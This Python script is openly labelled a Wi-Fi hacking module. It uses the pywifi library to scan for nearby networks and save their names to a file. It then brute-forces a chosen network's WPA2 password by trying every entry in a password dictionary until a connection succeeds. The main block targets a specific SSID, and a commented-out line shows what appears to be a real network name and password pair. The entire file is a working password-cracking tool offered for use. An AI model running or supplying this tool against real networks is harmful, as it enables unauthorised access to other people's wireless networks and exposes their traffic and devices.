#!/usr/bin/env python3
# -*- coding: utf-8 -*-

' a hack wifi module '

__author__ = 'Seel'

import pywifi
import time
from pywifi import const

class wifi(object):
    def diswifi(self):#断开wifi连接
        wifi = pywifi.PyWiFi()
        ifaces = wifi.interfaces()[0]
        ifaces.disconnect()
        time.sleep(3)  # 缓冲3秒

    def conwifi(self,user,pw):#连接wifi，参数为SSID,密码
        profile = pywifi.Profile()
        profile.ssid = user
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pw
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.remove_all_network_profiles()#清除上一次的WIFI配置，如密码等
        profile = iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(0.5)  # 延时是必要的,等待0.5秒连接是否成功
        success = True
        if iface.status() == const.IFACE_CONNECTED:
            print("成功连接 :" + pw)

        else:
            print("连接失败")
            #print(iface.status())
            #iface.disconnect()  # 断开连接
            success = False
        return success

    def fire(self,user,path='password.txt'):#字典破解WIFI，参数为字典路径名，默认路径为"code.txt"
        fpath = path
        file = open(fpath, 'r',encoding='utf-8')
        isok = True
        count=0
        while isok:
            fd = file.readline()
            count=count+1
            if fd:
                fd = fd[:-1]
                print("尝试第 "+str(count)+" 次,密码:"+fd)
                if self.conwifi(user,fd):
                    isok = False
            else:
                break
        file.close()

    def scan(self):#扫描SSID
        wifi = pywifi.PyWiFi()  # 创建一个无线对象
        ifaces = wifi.interfaces()[0]  # 取第一个无限网卡
        ifaces.scan()
        time.sleep(2)
        bessis = ifaces.scan_results()
        SSID = open('SSID.txt', 'w', encoding='utf-8')
        count = 0
        for d in bessis:
            count = count + 1
            SSID.write(d.ssid + '\n')
            print(d.ssid)
        SSID.close()
        print(str(count) + "个SSID,保存在SSID.txt")




if __name__=='__main__':
    test = wifi()
    #test.scan()
    #test.diswifi()
    #test.conwifi('wwch13','35470al')
    test.fire('wwch13')
    #test.fire('wwch13','password.txt')